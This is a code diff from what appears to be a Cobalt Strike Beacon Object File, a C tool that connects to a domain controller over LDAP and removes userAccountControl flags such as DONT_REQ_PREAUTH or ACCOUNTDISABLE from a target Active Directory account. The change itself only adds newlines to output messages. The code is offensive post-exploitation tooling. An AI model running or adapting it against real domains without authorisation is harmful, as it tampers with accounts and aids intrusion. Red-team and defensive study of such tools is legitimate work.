@@ -89,32 +89,32 @@ void go(char *args, int alen) {
     int useLdaps = BeaconDataInt(&parser);
 
     if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required\n");
         return;
     }
 
     if (!flagsValue || MSVCRT$strlen(flagsValue) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Flags are required (e.g., DONT_REQ_PREAUTH,ACCOUNTDISABLE)");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Flags are required (e.g., DONT_REQ_PREAUTH,ACCOUNTDISABLE)\n");
         return;
     }
 
     DWORD flagsToRemove = ParseUACFlags(flagsValue);
     if (flagsToRemove == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No valid flags parsed");
+        BeaconPrintf(CALLBACK_ERROR, "[-] No valid flags parsed\n");
         return;
     }
 
     // Safety check: warn if trying to remove account type flags
     if (flagsToRemove & UF_ACCOUNT_TYPE_MASK) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] WARNING: Cannot remove account type flags!");
-        BeaconPrintf(CALLBACK_ERROR, "[!] This would corrupt the account.");
+        BeaconPrintf(CALLBACK_ERROR, "[!] WARNING: Cannot remove account type flags!\n");
+        BeaconPrintf(CALLBACK_ERROR, "[!] This would corrupt the account.\n");
         return;
     }
 
     char* dcHostname = NULL;
     LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection\n");
         return;
     }
 
@@ -122,7 +122,7 @@ void go(char *args, int alen) {
     if (!isTargetDN) {
         defaultNC = GetDefaultNamingContext(ld, dcHostname);
         if (!defaultNC) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context\n");
             if (dcHostname) MSVCRT$free(dcHostname);
             CleanupLDAP(ld);
             return;
@@ -138,7 +138,7 @@ void go(char *args, int alen) {
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
         targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
         if (!targetDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found", targetIdentifier);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found\n", targetIdentifier);
             if (defaultNC) MSVCRT$free(defaultNC);
             if (dcHostname) MSVCRT$free(dcHostname);
             CleanupLDAP(ld);
@@ -152,7 +152,7 @@ void go(char *args, int alen) {
     ULONG result = WLDAP32$ldap_search_s(ld, targetDN, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &searchResult);
 
     if (result != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read current UAC");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read current UAC\n");
         MSVCRT$free(targetDN);
         if (defaultNC) MSVCRT$free(defaultNC);
         if (dcHostname) MSVCRT$free(dcHostname);
@@ -187,9 +187,9 @@ void go(char *args, int alen) {
     result = WLDAP32$ldap_modify_s(ld, targetDN, mods);
 
     if (result == LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully removed UAC flags");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully removed UAC flags\n");
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to modify UAC");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to modify UAC\n");
         PrintLdapError("Modify UAC", result);
     }
 
